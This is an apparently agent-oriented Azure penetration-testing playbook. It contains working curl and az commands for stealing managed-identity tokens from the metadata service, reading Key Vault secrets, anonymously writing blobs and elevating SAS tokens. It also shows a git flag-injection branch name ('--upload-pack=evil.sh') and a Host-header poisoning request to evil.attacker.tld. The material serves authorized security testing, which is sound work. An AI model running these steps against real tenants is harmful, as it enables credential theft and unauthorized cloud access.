---
name: azure
category: cloud
description: Azure security testing covering blob storage, Azure AD, managed identity, App Service misconfig, and Key Vault access
depends_on: []
---

# Azure Security Testing

Security testing for Azure-hosted applications and infrastructure. Focus on Blob Storage enumeration, Azure AD tenant discovery, managed identity exploitation, App Service misconfiguration, and Key Vault access.

## When to Use

- Target application is hosted on Azure (App Service, AKS, Azure Functions, VMs)
- Azure Blob Storage URLs discovered during recon (*.blob.core.windows.net)
- Azure AD authentication is in use (login.microsoftonline.com, *.onmicrosoft.com)
- SSRF or cloud metadata access is suspected on Azure infrastructure
- Azure API tokens or connection strings found in source or responses

## Methodology

### 1. Blob Storage Enumeration

**Discovery**
- Look for `*.blob.core.windows.net` references in JS, HTML, API responses, DNS
- Common patterns: `{company}storage`, `{company}assets`, `{company}{env}`
- Check for Azure CDN endpoints: `*.azureedge.net`

**Access Testing**
```bash
# List containers (anonymous)
curl "https://{account}.blob.core.windows.net/?comp=list"

# List blobs in container (anonymous)
curl "https://{account}.blob.core.windows.net/{container}?restype=container&comp=list"

# Read blob directly
curl "https://{account}.blob.core.windows.net/{container}/{blob}"

# Check for public access level
curl -I "https://{account}.blob.core.windows.net/{container}?restype=container"
```

**SAS Token Abuse**
- Extract SAS tokens from URLs, JS bundles, API responses
- Check token scope: is it account-level or container/blob-level?
- Test token reuse across containers and accounts
- Check expiry: long-lived SAS tokens are high value
- Try elevating permissions: replace `sp=r` with `sp=rwdl`

### 2. Azure AD Tenant Discovery

**Enumeration**
```bash
# Get tenant ID from domain
curl "https://login.microsoftonline.com/{domain}/.well-known/openid-configuration"

# User enumeration (may be rate-limited)
# POST to login.microsoftonline.com with username to observe error differences

# Check for open app registrations
curl "https://login.microsoftonline.com/{tenant}/v2.0/.well-known/openid-configuration"
```

**OAuth Misconfiguration**
- Check redirect_uri validation: test open redirect via wildcard or subdomain takeover
- Verify audience (aud) claim validation in tokens
- Test multi-tenant apps accepting tokens from any tenant
- Check for overly broad API permissions (Graph API, Azure Management)
- Probe for client credential exposure in public repos or JS bundles

### 3. Managed Identity Exploitation

**Instance Metadata Service (IMDS)**
```bash
# Get access token (requires Metadata header)
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Instance metadata
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# List subscriptions with obtained token
curl -H "Authorization: Bearer {token}" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

**Post-Token Enumeration**
- List resource groups and resources in subscription
- Check Key Vault access policies
- Enumerate storage accounts and their keys
- List App Service configurations (may contain connection strings)
- Check Azure SQL/Cosmos DB access

### 4. App Service Misconfiguration

**Information Disclosure**
- Kudu console: `https://{app}.scm.azurewebsites.net/` (requires auth but check for misconfig)
- Environment variables via error pages or debug endpoints
- `.git/` exposure on App Service (if deployed via Git)
- Check `/robots.txt`, `/web.config` for path leaks

**Authentication Issues**
- EasyAuth (App Service Authentication): test bypass by calling API directly without auth headers
- Check if authentication is enforced at the platform level vs application level
- Token validation: verify aud/iss claims match the intended app registration
- Test for authentication bypass via X-MS-CLIENT-PRINCIPAL header injection

**Configuration**
- CORS misconfiguration: check Access-Control-Allow-Origin for wildcard or overly broad origins
- TLS settings: minimum TLS version, client certificate requirements
- IP restrictions: test if access controls apply to both main site and SCM site

### 5. Key Vault Access

**If managed identity token or credentials obtained:**
```bash
# List vaults (with management token)
curl -H "Authorization: Bearer {mgmt_token}" \
  "https://management.azure.com/subscriptions/{sub}/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01"

# Get vault token (different resource)
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"

# List secrets
curl -H "Authorization: Bearer {vault_token}" \
  "https://{vault}.vault.azure.net/secrets?api-version=7.4"

# Get secret value
curl -H "Authorization: Bearer {vault_token}" \
  "https://{vault}.vault.azure.net/secrets/{name}?api-version=7.4"
```

**Access Policy Issues**
- Check if managed identity has overly broad Key Vault permissions
- Test cross-resource access: can one app's identity read another app's secrets?
- Verify soft-delete and purge protection configuration

## Key Commands

```bash
# Azure CLI equivalents
az login --identity  # Use managed identity
az account show
az storage blob list --account-name {acct} --container-name {container}
az keyvault secret list --vault-name {vault}
az webapp config appsettings list --name {app} --resource-group {rg}
az ad app list --display-name {name}
```

## Validation

- Demonstrate unauthorized blob storage access with sensitive data
- Show managed identity token retrieval via SSRF and subsequent resource access
- Prove App Service authentication bypass with direct API access
- Confirm Key Vault secret retrieval through overly permissive access policies
- Document exact curl commands, tokens used, and responses received

## Corpus-Derived Advanced Techniques

### Argument Injection in Git-Backed Deployments

When Azure services shell out to CLI tools (git, az, terraform) with user-controlled values:
```bash
# Git flag injection via repository URL or branch name
# Test: does the service pass user input as argv to git commands?
# Inject: --upload-pack, --config, -c, --exec-path
# Example: branch name "main --upload-pack=evil.sh" may execute arbitrary code
```
Audit every parameter position in CLI tool invocations for flag injection.

### Azure DevOps / Pipelines Task Boundary Escape

CI/CD pipelines have a boundary between task execution and pipeline control:
```bash
# Test: can a running task modify pipeline variables?
# Test: can a task access secrets from other stages?
# Test: can PR-submitted code influence pipeline definition?
# Check: logging commands like ##vso[task.setvariable] can set secrets
```

### Hardcoded Cloud Asset Reconnaissance in Source

Search target's public repos for hardcoded Azure resource references:
```bash
grep -rE '(\.azurewebsites\.net|\.blob\.core\.windows\.net|\.table\.core\.windows\.net|\.queue\.core\.windows\.net|\.azureedge\.net|\.azure-api\.net|\.azurecontainer\.io)' \
  /workspace --include='*.js' --include='*.json' --include='*.yaml' --include='*.yml' --include='*.tf' \
  | sort -u > azure_assets.txt
# Each discovered asset is a lead for permissions testing
```
Also check CI configs, Dockerfiles, Helm charts, and Terraform state files.

### Cloud Bucket Four-Mode Test

For every discovered Azure Blob Storage container:
```bash
# 1. Anonymous list
curl "https://{account}.blob.core.windows.net/{container}?restype=container&comp=list"
# 2. Anonymous read (test specific blob paths from source/JS)
curl "https://{account}.blob.core.windows.net/{container}/{blob}"
# 3. Anonymous write
curl -X PUT "https://{account}.blob.core.windows.net/{container}/test.txt" \
  -H "x-ms-blob-type: BlockBlob" -d "test"
# 4. Authenticated with any Azure account (allAuthenticatedUsers equivalent)
az storage blob list --account-name {account} --container-name {container} --auth-mode login
```

### Host Header Poisoning on PaaS Platforms

Azure App Service, Heroku, and AWS Elastic Beanstalk share a vulnerability class:
```bash
# Test Host header injection on password-reset and email-sending flows
curl -X POST "https://target.azurewebsites.net/api/reset-password" \
  -H "Host: evil.attacker.tld" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'
# If the password-reset email contains a link using the injected Host, it is exploitable
```

### Exposed CI/CD Management UI Probing

Internet-exposed CI/CD dashboards are common on Azure infrastructure:
```bash
# Jenkins alternate UI routes
curl -s "https://ci.target.tld/blue/organizations/" -o /dev/null -w '%{http_code}'
curl -s "https://ci.target.tld/asynchPeople/" -o /dev/null -w '%{http_code}'
curl -s "https://ci.target.tld/script" -o /dev/null -w '%{http_code}'
# Azure DevOps: check for public project visibility
# TeamCity: /app/rest/server, /app/rest/users
# Drone: /api/repos
```

### Opt-In Security Feature Gap Analysis

For any security feature retrofitted onto a large API surface (RBAC, sandboxes, permission models):
```bash
# Methodology:
# 1. List all API methods/endpoints in the surface
# 2. Identify which ones were covered by the opt-in security feature
# 3. Test the gap: APIs NOT covered by the feature are the exploit surface
# Example: Node.js --permission flag covers fs/net but may miss child_process
# Example: Azure RBAC covers management API but may miss data-plane API
```

### NS Record Subdomain Takeover

Check both CNAME and NS delegations for dangling DNS:
```bash
# For every subdomain, check NS records (not just CNAME)
dig NS sub.target.tld +short
# If NS points to a cloud DNS provider (Route 53, Azure DNS, GCP DNS, NS1)
# AND the hosted zone is not claimed, the subdomain is takeover-able
# This is higher-impact than CNAME takeover: full DNS control over the subdomain
```
